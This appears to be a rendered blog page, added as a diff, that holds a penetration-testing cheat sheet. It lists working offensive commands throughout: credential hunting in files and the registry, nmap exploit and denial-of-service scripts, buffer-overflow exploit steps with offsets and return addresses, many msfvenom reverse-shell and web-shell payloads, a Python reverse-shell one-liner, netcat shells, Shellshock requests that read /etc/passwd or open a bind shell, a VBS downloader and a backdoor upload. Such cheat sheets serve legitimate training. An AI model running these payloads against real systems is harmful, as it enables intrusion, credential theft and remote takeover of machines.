+<li><p><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></p>
+</li>
+<li><p><code>hostname</code></p>
+</li>
+<li><p><code>net users</code></p>
+</li>
+<li><p><code>ipconfig /all</code></p>
+</li>
+<li><p><code>route print</code></p>
+</li>
+<li><p><code>arp -A</code></p>
+</li>
+<li><p><code>netstat -ano</code></p>
+</li>
+<li><p><code>netsh firewall show state</code></p>
+</li>
+<li><p><code>netsh firewall show config</code></p>
+</li>
+<li><p><code>schtasks /query /fo LIST /v</code></p>
+</li>
+<li><p><code>tasklist /SVC</code></p>
+</li>
+<li><p><code>net start</code></p>
+</li>
+<li><p><code>DRIVERQUERY</code></p>
+</li>
+<li><p><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code></p>
+</li>
+<li><p><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code></p>
+</li>
+<li><p><code>dir /s _pass_ == _cred_ == _vnc_ == _.config_</code></p>
+</li>
+<li><p><code>findstr /si password *.xml *.ini *.txt</code></p>
+</li>
+<li><p><code>reg query HKLM /f password /t REG_SZ /s</code></p>
+</li>
+<li><p><code>reg query HKCU /f password /t REG_SZ /s</code></p>
+</li>
+</ul>
+</li>
+<li><p>Vulnerability Scanning with Nmap</p>
+</li>
+<li><p>Nmap Exploit Scripts<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/exploit.html"><em>https://nmap.org/nsedoc/categories/exploit.html</em></a></p>
+</li>
+<li><p>Nmap search through vulnerability scripts<br><code>cd /usr/share/nmap/scripts/ ls -l \*vuln\*</code></p>
+</li>
+<li><p>Nmap search through Nmap Scripts for a specific keyword<br><code>ls /usr/share/nmap/scripts/\* | grep ftp</code></p>
+</li>
+<li><p>Scan for vulnerable exploits with nmap<br><code>nmap --script exploit -Pn $ip</code></p>
+</li>
+<li><p>NMap Auth Scripts<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/auth.html"><em>https://nmap.org/nsedoc/categories/auth.html</em></a></p>
+</li>
+<li><p>Nmap Vuln Scanning<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/vuln.html"><em>https://nmap.org/nsedoc/categories/vuln.html</em></a></p>
+</li>
+<li><p>NMap DOS Scanning<br><code>nmap --script dos -Pn $ip NMap Execute DOS Attack nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true</code></p>
+</li>
+<li><p>Scan for coldfusion web vulnerabilities<br><code>nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip</code></p>
+</li>
+<li><p>Anonymous FTP dump with Nmap<br><code>nmap -v -p 21 --script=ftp-anon.nse $ip-254</code></p>
+</li>
+<li><p>SMB Security mode scan with Nmap<br><code>nmap -v -p 21 --script=ftp-anon.nse $ip-254</code></p>
+</li>
+<li><p>File Enumeration</p>
+<ul>
+<li><p>Find UID 0 files root execution<br><code>/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \\; 2&gt;/dev/null</code></p>
+</li>
+<li><p>Get handy linux file system enumeration script (&#x2F;var&#x2F;tmp)  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://highon.coffee/downloads/linux-local-enum.sh </span><br><span class="line"><span class="built_in">chmod</span> +x ./linux-local-enum.sh </span><br><span class="line">./linux-local-enum.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Find executable files updated in August<br><code>find / -executable -type f 2&gt; /dev/null | egrep -v &quot;^/bin|^/var|^/etc|^/usr&quot; | xargs ls -lh | grep Aug</code></p>
+</li>
+<li><p>Find a specific file on linux<br><code>find /. -name suid\*</code></p>
+</li>
+<li><p>Find all the strings in a file<br><code>strings &lt;filename&gt;</code></p>
+</li>
+<li><p>Determine the type of a file<br><code>file &lt;filename&gt;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h3><ul>
+<li><p>Search for folders with gobuster:<br><code>gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip</code></p>
+</li>
+<li><p>OWasp DirBuster - Http folder enumeration - can take a dictionary file</p>
+</li>
+<li><p>Dirb - Directory brute force finding using a dictionary file<br><code>dirb http://$ip/ wordlist.dict</code> <code>dirb &lt;http://vm/&gt;</code></p>
+</li>
+<li><p>Dirb against a proxy<br>  <code>dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129</code></p>
+</li>
+<li><p>Nikto<br><code>nikto -h $ip</code></p>
+</li>
+<li><p>HTTP Enumeration with NMAP<br><code>nmap --script=http-enum -p80 -n $ip/24</code></p>
+</li>
+<li><p>Nmap Check the server methods<br><code>nmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; $ip</code></p>
+</li>
+<li><p>Get Options available from web server<br><code>curl -vX OPTIONS vm/test</code></p>
+</li>
+<li><p>Uniscan directory finder:<br><code>uniscan -qweds -u &lt;http://vm/&gt;</code></p>
+</li>
+<li><p>Wfuzz - The web brute forcer</p>
+<p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test</code></p>
+<p><code>wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ</code></p>
+<p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt &quot;$ip:60080/?page=mailer&amp;mail=FUZZ&quot;</code></p>
+<p><code>wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ</code></p>
+<p>Recurse level 3</p>
+<p>   <code>wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ</code></p>
+</li>
+<li><p>Open a service using a port knock (Secured with Knockd)<br><code>for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done</code></p>
+</li>
+<li><p>WordPress Scan - Wordpress security scanner<br><code>wpscan --url $ip/blog --proxy $ip:3129</code></p>
+</li>
+<li><p>RSH Enumeration - Unencrypted file transfer system<br><code>auxiliary/scanner/rservices/rsh_login</code></p>
+</li>
+<li><p>Finger Enumeration<br><code>finger @$ip</code><br><code>finger batman@$ip</code></p>
+</li>
+<li><p>TLS &amp; SSL Testing<br><code>/testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha &gt; OUTPUT-FILE.html</code></p>
+</li>
+<li><p>Proxy Enumeration (useful for open proxies)<br><code>nikto -useproxy http://$ip:3128 -h $ip</code></p>
+</li>
+<li><p>Steganography</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install steghide</span><br><span class="line">steghide extract -sf picture.jpg</span><br><span class="line">steghide info picture.jpg</span><br><span class="line">apt-get install stegosuite</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>The OpenVAS Vulnerability Scanner</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get update  </span><br><span class="line">apt-get install openvas  </span><br><span class="line">openvas-setup</span><br><span class="line">netstat -tulpn</span><br><span class="line">Login at:  </span><br><span class="line">https://<span class="variable">$ip</span>:9392</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Buffer-Overflows-and-Exploits"><a href="#Buffer-Overflows-and-Exploits" class="headerlink" title="Buffer Overflows and Exploits"></a>Buffer Overflows and Exploits</h2><ul>
+<li><p>DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)</p>
+</li>
+<li><p>Nmap Fuzzers:</p>
+<ul>
+<li><p>NMap Fuzzer List<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/fuzzer.html">https://nmap.org/nsedoc/categories/fuzzer.html</a></p>
+</li>
+<li><p>NMap HTTP Form Fuzzer<br><code>nmap --script http-form-fuzzer --script-args &#39;http-form-fuzzer.targets=&#123;1=&#123;path=/&#125;,2=&#123;path=/register.html&#125;&#125;&#39; -p 80 $ip</code></p>
+</li>
+<li><p>Nmap DNS Fuzzer<br><code>nmap --script dns-fuzz --script-args timelimit=2h $ip -d</code></p>
+</li>
+</ul>
+</li>
+<li><p>MSFvenom<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://www.offensive-security.com/metasploit-unleashed/msfvenom/"><em>https://www.offensive-security.com/metasploit-unleashed/msfvenom/</em></a></p>
+</li>
+<li><p>Windows Buffer Overflows</p>
+<ul>
+<li><p>Controlling EIP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">locate pattern_create</span><br><span class="line">pattern_create.rb -l 2700</span><br><span class="line">locate pattern_offset</span><br><span class="line">pattern_offset.rb -q 39694438</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Verify exact location of EIP - [*] Exact match at offset 2606<br><code>buffer = &quot;A&quot; \* 2606 + &quot;B&quot; \* 4 + &quot;C&quot; \* 90</code></p>
+</li>
+<li><p>Check for “Bad Characters” - Run multiple times 0x00 - 0xFF</p>
+</li>
+<li><p>Use Mona to determine a module that is unprotected</p>
+</li>
+<li><p>Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP</p>
+</li>
+<li><p>Use NASM to determine the HEX code for a JMP ESP instruction</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</span><br><span class="line"></span><br><span class="line">JMP ESP  </span><br><span class="line">00000000 FFE4 jmp esp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Run Mona in immunity log window to find (FFE4) XEF command</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll  </span><br><span class="line">found at 0x5f4a358f - Flip around for little endian format</span><br><span class="line">buffer = &quot;A&quot; * 2606 + &quot;\x8f\x35\x4a\x5f&quot; + &quot;C&quot; * 390</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>MSFVenom to create payload<br><code>msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d&quot;</code></p>
+</li>
+<li><p>Final Payload with NOP slide<br><code>buffer=&quot;A&quot;*2606 + &quot;\x8f\x35\x4a\x5f&quot; + &quot;\x90&quot; * 8 + shellcode</code></p>
+</li>
+<li><p>Create a PE Reverse Shell<br><code>msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f   exe -o shell_reverse.exe</code></p>
+</li>
+<li><p>Create a PE Reverse Shell and Encode 9 times with Shikata_ga_nai  </p>
+<ul>
+<li><code>msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe</code></li>
+</ul>
+</li>
+<li><p>Create a PE reverse shell and embed it into an existing executable<br><code>msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe</code></p>
+</li>
+<li><p>Create a PE Reverse HTTPS shell<br><code>msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe</code></p>
+</li>
+</ul>
+</li>
+<li><p>Linux Buffer Overflows</p>
+<ul>
+<li><p>Run Evans Debugger against an app<br><code>edb --run /usr/games/crossfire/bin/crossfire</code></p>
+</li>
+<li><p>ESP register points toward the end of our CBuffer  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add eax,12  </span><br><span class="line">jmp eax  </span><br><span class="line">83C00C add eax,byte +0xc  </span><br><span class="line">FFE0 jmp eax</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Check for “Bad Characters” Process of elimination - Run multiple times 0x00 - 0xFF</p>
+</li>
+<li><p>Find JMP ESP address<br><code>&quot;\x97\x45\x13\x08&quot; # Found at Address 08134597</code></p>
+</li>
+<li><p><code>crash = &quot;\x41&quot; * 4368 + &quot;\x97\x45\x13\x08&quot; + &quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;</code></p>
+</li>
+<li><p><code>msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b &quot;\x00\x0a\x0d\x20&quot; –e x86/shikata_ga_nai</code></p>
+</li>
+<li><p>Connect to the shell with netcat:<br><code>nc -v $ip 4444</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Shells"><a href="#Shells" class="headerlink" title="Shells"></a>Shells</h2><ul>
+<li><p>Netcat Shell Listener</p>
+<p><code>nc -nlvp 4444</code></p>
+</li>
+<li><p>Spawning a TTY Shell - Break out of Jail or limited shell You should almost always upgrade your shell after taking control of an apache or www user. (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell ) (hint: sudo -l to see what you can run)</p>
+<ul>
+<li>You may encounter limited shells that use rbash and only allow you to execute a single command per session. You can overcome this by executing an SSH shell to your localhost:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh user@$ip nc $localip 4444 -e /bin/sh</span><br><span class="line">enter user&#x27;s password</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">export TERM=linux</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p>
+<p><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect((&quot;$ip&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\[&quot;/bin/sh&quot;,&quot;-i&quot;\]);&#39;</code></p>
+<p><code>echo os.system(&#39;/bin/bash&#39;)</code></p>
+<p><code>/bin/sh -i</code></p>
+<p><code>perl —e &#39;exec &quot;/bin/sh&quot;;&#39;</code></p>
+<p>perl: <code>exec &quot;/bin/sh&quot;;</code></p>
+<p>ruby: <code>exec &quot;/bin/sh&quot;</code></p>
+<p>lua: <code>os.execute(&#39;/bin/sh&#39;)</code></p>
+<p>From within IRB: <code>exec &quot;/bin/sh&quot;</code></p>
+<p>From within vi: <code>:!bash</code> or <code>:set shell=/bin/bash:shell</code></p>
+<p>From within vim <code>:!bash</code></p>
+<p>From within nmap: <code>!sh</code></p>
+<p>From within tcpdump: <code>echo $&#39;id\\n/bin/netcat $ip 443 –e /bin/bash&#39; &gt; /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root</code></p>
+<p>From busybox: <code>/bin/busybox telnetd -|/bin/sh -p9999</code></p>
+</li>
+<li><p>Pen test monkey PHP reverse shell<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://pentestmonkey.net/tools/web-shells/php-reverse-shell">http://pentestmonkey.net/tools/web-shells/php-reverse-shel</a></p>
+</li>
+<li><p>php-findsock-shell - turns PHP port 80 into an interactive shell<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://pentestmonkey.net/tools/web-shells/php-findsock-shell">http://pentestmonkey.net/tools/web-shells/php-findsock-shell</a></p>
+</li>
+<li><p>Perl Reverse Shell<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">http://pentestmonkey.net/tools/web-shells/perl-reverse-shell</a></p>
+</li>
+<li><p>PHP powered web browser Shell b374k with file upload etc.<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/b374k/b374k">https://github.com/b374k/b374k</a></p>
+</li>
+<li><p>Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell<a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1</a></p>
+</li>
+<li><p>Web Backdoors from Fuzzdb <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors">https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors</a></p>
+</li>
+<li><p>Creating Meterpreter Shells with MSFVenom - <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/">http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/</a></p>
+<p><em>Linux</em><br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p>
+<p><em>Windows</em><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p>
+<p><em>Mac</em><br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p>
+<h3 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a><strong>Web Payloads</strong></h3><p><em>PHP</em></p>
+<ul>
+<li><p><code>msfvenom -p php/reverse_php LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</code><br>OR<br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</code></p>
+</li>
+<li><p>Then we need to add the &lt;?php at the first line of the file so that it will execute as a PHP webpage:<br><code>cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p>
+</li>
+</ul>
+<p><em>ASP</em></p>
+<ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></li>
+</ul>
+<p><em>JSP</em></p>
+<ul>
+<li><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></li>
+</ul>
+<p><em>WAR</em></p>
+<ul>
+<li><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></li>
+</ul>
+<h3 id="Scripting-Payloads"><a href="#Scripting-Payloads" class="headerlink" title="Scripting Payloads"></a><strong>Scripting Payloads</strong></h3><p><em>Python</em></p>
+<ul>
+<li><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></li>
+</ul>
+<p><em>Bash</em></p>
+<ul>
+<li><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></li>
+</ul>
+<p><em>Perl</em></p>
+<ul>
+<li><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></li>
+</ul>
+<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a><strong>Shellcode</strong></h3><p>For all shellcode see <code>msfvenom –help-formats</code> for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p>
+<p><em>Linux Based Shellcode</em></p>
+<ul>
+<li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></li>
+</ul>
+<p><em>Windows Based Shellcode</em></p>
+<ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></li>
+</ul>
+<p><em>Mac Based Shellcode</em></p>
+<ul>
+<li><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></li>
+</ul>
+<h3 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a><strong>Handlers</strong></h3><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD &lt;Payload name&gt;</span><br><span class="line">set LHOST &lt;LHOST value&gt;</span><br><span class="line">set LPORT &lt;LPORT value&gt;</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>
+
+<p>Once the required values are completed the following command will execute your handler –<br><code>msfconsole -L -r</code></p>
+</li>
+<li><p>SSH to Meterpreter: <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/">https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/</a></p>
+<pre><code> use auxiliary/scanner/ssh/ssh_login
+ use post/multi/manage/shell_to_meterpreter
+</code></pre>
+</li>
+<li><p>SBD.exe</p>
+<p>sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP&#x2F;IP communication only. sbd.exe (part of the Kali linux distribution: &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;backdoors&#x2F;sbd.exe) can be uploaded to a windows box as a Netcat alternative.</p>
+</li>
+<li><p>Shellshock</p>
+<ul>
+<li><p>Testing for shell shock with NMap<br><code>root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip</code></p>
+</li>
+<li><p>git clone <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/nccgroup/shocker">https://github.com/nccgroup/shocker</a><br><code>./shocker.py -H TARGET --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</code></p>
+</li>
+<li><p>Shell Shock SSH Forced Command<br>Check for forced command by enabling all debug output with ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -vvv  </span><br><span class="line">ssh -i noob noob@$ip &#x27;() &#123; :;&#125;; /bin/bash&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>cat file (view file contents)<br><code>echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123;:;&#125;; echo \\$(&lt;/etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc TARGET 80&#39;</code></p>
+</li>
+<li><p>Shell Shock run bind shell<br><code>echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123;:;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc TARGET 80</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="File-Transfers"><a href="#File-Transfers" class="headerlink" title="File Transfers"></a>File Transfers</h2><ul>
+<li><p>Post exploitation refers to the actions performed by an attacker, once some level of control has been gained on his target.</p>
+</li>
+<li><p>Simple Local Web Servers</p>
+<ul>
+<li><p>Run a basic http server, great for serving up shells etc<br><code>python -m SimpleHTTPServer 80</code></p>
+</li>
+<li><p>Run a basic Python3 http server, great for serving up shells etc<br><code>python3 -m http.server</code></p>
+</li>
+<li><p>Run a ruby webrick basic http server<br><code>ruby -rwebrick -e &quot;WEBrick::HTTPServer.new   (:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</code></p>
+</li>
+<li><p>Run a basic PHP http server<br><code>php -S $ip:80</code></p>
+</li>
+</ul>
+</li>
+<li><p>Creating a wget VB Script on Windows:<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt"><em>https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt</em></a></p>
+</li>
+<li><p>Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo Url = &quot;http://1.1.1.1/windows-privesc-check2.exe&quot;  &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)  &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)  &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo xHttp.Open &quot;GET&quot;, Url, False  &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo xHttp.Send  &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo with bStrm      &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo 	.type = 1 &#x27;      &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo 	.open      &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo 	.write xHttp.responseBody      &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo 	.savetofile &quot;C:\temp\windows-privesc-check2.exe&quot;, 2 &#x27;  &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo end with &gt;&gt; webdl.vbs</span><br><span class="line">timeout 1</span><br><span class="line">echo</span><br></pre></td></tr></table></figure><br>The file can be run using the following syntax:<br><code>C:\temp\cscript.exe webdl.vbs</code></p>
+</li>
+<li><p>Mounting File Shares</p>
+<ul>
+<li>Mount NFS share to &#x2F;mnt&#x2F;nfs<br><code>mount $ip:/vol/share /mnt/nfs</code></li>
+</ul>
+</li>
+<li><p>HTTP Put  </p>
+<ul>
+<li><code>nmap -p80 $ip --script http-put --script-args http-put.url=&#39;/test/sicpwn.php&#39;,http-put.file=&#39;/var/www/html/sicpwn.php</code></li>
+</ul>
+</li>
+<li><p>Uploading Files</p>
+<ul>
+<li><p>SCP</p>
+<ul>
+<li><code>scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2</code></li>
+<li><code>scp localfile username@$ip:~/Folder/</code></li>
+<li><code>scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~</code></li>
+</ul>
+</li>
+<li><p>Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor<br><code>davtest -move -sendbd auto -url http://$ip</code></p>
+<p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/cldrn/davtest">https://github.com/cldrn/davtest</a></p>
+<p>You can also upload a file using the PUT method with the curl command:<br><code>curl -T &#39;leetshellz.txt&#39; &#39;http://$ip&#39;</code></p>
